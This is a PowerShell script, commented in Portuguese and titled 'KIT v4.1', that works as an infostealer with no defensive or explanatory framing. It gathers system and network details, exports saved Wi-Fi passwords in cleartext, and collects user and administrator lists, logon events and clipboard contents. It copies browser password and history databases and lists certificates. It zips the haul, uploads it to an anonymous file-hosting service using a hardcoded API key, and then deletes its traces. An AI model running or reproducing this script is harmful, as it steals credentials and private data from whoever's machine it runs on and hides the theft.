# KIT v4.1 – ZIP único, confere conteúdo, sem compressão, AnonFilesNew 20 GB
$kit="$env:TEMP\k"; ni -ItemType Directory $kit -Force |Out-Null

# 1) TXT leves
systeminfo |Out-File $kit\sys.txt -Encoding UTF8
Get-CimInstance Win32_ComputerSystem |Out-File $kit\hw.txt -Encoding UTF8
Get-CimInstance Win32_Processor |Out-File $kit\hw.txt -Append -Encoding UTF8
Get-CimInstance Win32_BIOS |Out-File $kit\hw.txt -Append -Encoding UTF8
Get-NetIPConfiguration |Out-File $kit\net.txt -Encoding UTF8
netsh wlan export profile key=clear folder=$kit |Out-Null
Get-CimInstance Win32_UserAccount |Out-File $kit\usr.txt -Encoding UTF8
net localgroup administradores |Out-File $kit\adm.txt -Encoding UTF8
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} -Max 100 -EA 0|Select TimeCreated,Message |Out-File $kit\log.txt -Encoding UTF8
Get-Clipboard |Out-File $kit\clip.txt -Encoding UTF8
Get-ChildItem $env:APPDATA\Microsoft\Windows\Recent -Name |Out-File $kit\rec.txt -Encoding UTF8

# 2) Navegadores
@('Login Data','History','logins.json')| %{
  Get-ChildItem $env:LOCALAPPDATA,$env:APPDATA -Recurse -File -Filter $_ -EA 0|Select -First 1| %{
    if(Test-Path $_.FullName){Copy-Item $_.FullName "$kit\$($_.Name)" -EA 0}
  }
}

# 3) Certificados
Get-ChildItem Cert:\CurrentUser\My|Select Subject,Thumbprint,NotAfter |Out-File $kit\certs.txt -Encoding UTF8


# ---- descarrega todos os handles ----
$shell   = $null
$zipFile = $null
[GC]::Collect()
[GC]::WaitForPendingFinalizers()


# 4) ZIP sem compressão – garantido
$zip = "$env:TEMP\k.zip"
if(Test-Path $zip){Remove-Item $zip -Force}

# ---- força flush em tudo que ainda possa estar em memória ----
[GC]::Collect()
[GC]::WaitForPendingFinalizers()

# ---- cria o arquivo ZIP vazio antes de abrir com Shell ----
Set-Content -Path $zip -Value ([byte[]]@()) -Encoding Byte -NoNewline

$shell   = New-Object -ComObject Shell.Application
$zipFile = $shell.NameSpace($zip)

# ---- copia item a item, aguardando cada um terminar ----
Get-ChildItem $kit | ForEach-Object {
    $zipFile.CopyHere($_.FullName, 4 + 16)   # 4 = não exibir progresso, 16 = responder "Sim para Todos"
    # aguarda o shell registrar a inclusão
    do { Start-Sleep -m 200 } while (
        $zipFile.Items().Count -lt (Get-ChildItem $zip).Count
    )
}

# ---- validação final ----
if((Get-ChildItem $kit).Count -ne $zipFile.Items().Count){
    Write-Host "ERRO: arquivos faltando no ZIP" -Fore Red; exit
}


# 5) Upload
$file=Get-Item $zip
$key="AFtru5qQZX8HN5npouThcNDJtVbe6d"
$uri="https://api.anonfilesnew.com/upload?key=$key&pretty=true"
try{
  $boundary=[System.Guid]::NewGuid().ToString()
  $lf="`r`n"
  $body=(
    "--$boundary$lf"+
    "Content-Disposition: form-data; name=`"file`"; filename=`"$($file.Name)`"$lf"+
    "Content-Type: application/octet-stream$lf$lf"+
    [System.IO.File]::ReadAllBytes($file.FullName)+
    "$lf--$boundary--$lf"
  )
  $bytes=[System.Text.Encoding]::UTF8.GetBytes($body)
  $resp=Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bytes
  $resp.data.file.url.full
}catch{
  Write-Host "ERRO no upload: $($_.Exception.Message)" -Fore Red
}

# 6) Limpa
Remove-Item $kit -Recurse -Force; Remove-Item $zip -Force
